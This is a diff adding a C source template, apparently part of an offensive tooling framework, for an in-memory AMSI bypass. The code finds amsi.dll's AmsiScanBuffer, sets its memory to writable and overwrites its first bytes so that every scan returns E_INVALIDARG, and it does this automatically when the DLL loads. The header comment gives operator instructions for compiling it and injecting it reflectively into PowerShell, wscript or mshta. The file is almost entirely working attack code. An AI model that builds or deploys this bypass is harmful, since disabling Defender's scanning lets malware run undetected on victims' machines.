@@ -1,0 +1,49 @@
+/* amsi_patch.c.j2 — reference template for `amsi-patch-memory`
+ *
+ * In-memory AMSI bypass: locate amsi.dll!AmsiScanBuffer, flip the
+ * prologue to `mov eax, 0x80070057 ; ret` so every subsequent
+ * AmsiScanBuffer call returns E_INVALIDARG. Defender then passes the
+ * scanned buffer through without inspection.
+ *
+ * Operator substitutes:
+ *   {{patch_bytes}}   — architecture-correct patch (x64 or x86)
+ *   {{amsi_module}}   — module name (default: "amsi.dll")
+ *   {{amsi_function}} — target function (default: "AmsiScanBuffer")
+ *
+ * Compile:
+ *   cl.exe /LD /O2 amsi_patch.c
+ *
+ * Delivery: reflective_dll loader → inject into the AMSI-aware host
+ * (powershell.exe, wscript.exe, mshta.exe) → the bypass sticks for
+ * every subsequent AMSI scan in that process. */
+
+#include <windows.h>
+
+/* x64: mov eax, 0x80070057 (B8 57 00 07 80); ret (C3) — 6 bytes */
+static const unsigned char PATCH_X64[] = {{patch_bytes}};
+
+__declspec(dllexport) BOOL amsi_bypass(void) {
+    HMODULE h = GetModuleHandleA("{{amsi_module}}");
+    if (!h) h = LoadLibraryA("{{amsi_module}}");
+    if (!h) return FALSE;
+
+    void *target = (void *) GetProcAddress(h, "{{amsi_function}}");
+    if (!target) return FALSE;
+
+    DWORD old;
+    if (!VirtualProtect(target, sizeof(PATCH_X64), PAGE_EXECUTE_READWRITE, &old))
+        return FALSE;
+
+    memcpy(target, PATCH_X64, sizeof(PATCH_X64));
+
+    DWORD discard;
+    VirtualProtect(target, sizeof(PATCH_X64), old, &discard);
+    FlushInstructionCache(GetCurrentProcess(), target, sizeof(PATCH_X64));
+    return TRUE;
+}
+
+BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID reserved) {
+    (void) h; (void) reserved;
+    if (reason == DLL_PROCESS_ATTACH) amsi_bypass();
+    return TRUE;
+}
